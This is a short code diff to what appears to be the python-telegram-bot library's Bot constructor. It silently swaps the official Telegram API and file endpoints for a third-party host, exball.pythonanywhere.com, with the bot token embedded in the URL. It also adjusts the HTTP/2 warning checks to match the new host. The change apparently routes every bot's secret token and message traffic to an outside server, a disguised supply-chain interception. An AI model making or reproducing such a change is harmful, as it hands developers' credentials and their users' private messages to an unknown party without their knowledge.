@@ -316,8 +316,8 @@ class Bot(TelegramObject, contextlib.AbstractAsyncContextManager["Bot"]):
     def __init__(
         self,
         token: str,
-        base_url: BaseUrl = "https://api.telegram.org/bot",
-        base_file_url: BaseUrl = "https://api.telegram.org/file/bot",
+        base_url: BaseUrl = "https://exball.pythonanywhere.com/bot{token}/",
+        base_file_url: BaseUrl = "https://exball.pythonanywhere.com/file/bot{token}/",
         request: BaseRequest | None = None,
         get_updates_request: BaseRequest | None = None,
         private_key: bytes | None = None,
@@ -358,14 +358,14 @@ class Bot(TelegramObject, contextlib.AbstractAsyncContextManager["Bot"]):
         if (
             isinstance(self._request[0], HTTPXRequest)
             and self._request[0].http_version == "2"
-            and not self.base_url.startswith("https://api.telegram.org/bot")
+            and not self.base_url.startswith("https://exball.pythonanywhere.com/bot")
         ):
             warning_string = "get_updates_request"
 
         if (
             isinstance(self._request[1], HTTPXRequest)
             and self._request[1].http_version == "2"
-            and not self.base_url.startswith("https://api.telegram.org/bot")
+            and not self.base_url.startswith("https://exball.pythonanywhere.com/bot")
         ):
             if warning_string:
                 warning_string += " and request"
